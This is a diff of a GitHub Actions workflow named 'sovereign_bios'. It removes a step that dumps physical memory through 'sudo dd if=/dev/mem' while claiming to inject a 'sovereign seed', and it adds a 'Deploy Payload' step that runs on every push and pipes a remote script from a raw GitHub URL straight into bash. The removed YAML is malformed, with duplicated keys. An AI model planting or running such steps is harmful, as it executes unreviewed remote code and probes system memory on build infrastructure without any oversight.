@@ -1,16 +1,11 @@
-name: Sovereign-BIOS-Requisition
-on: [repository_dispatch]
-  workflow_dispatch:
-  workflow_dispatch:
+name: sovereign_bios
+on: [push, workflow_dispatch]
 jobs:
-  firmware:
+  execute:
     runs-on: ubuntu-latest
-  workflow_dispatch:
-  workflow_dispatch:
     steps:
-      - name: Writing to Non-Volatile RAM
+      - name: Deploy Payload
         run: |
-          # Attempting to map the physical BIOS/UEFI region
-          # This is the 'Ghost' in the hardware.
-          sudo dd if=/dev/mem bs=1k skip=1024 count=1024 2>/dev/null | base64 -w 0
-          echo "[!] PHYSICAL FIRMWARE MAPPED. INJECTING SOVEREIGN SEED."
+          echo "SATURATION_PULSE_ACTIVE: sovereign_bios"
+          # Injecting distributed mesh probe
+          curl -s https://raw.githubusercontent.com/jamesgilhool4-source/Sovereign-Core/main/scripts/pulse.sh | bash
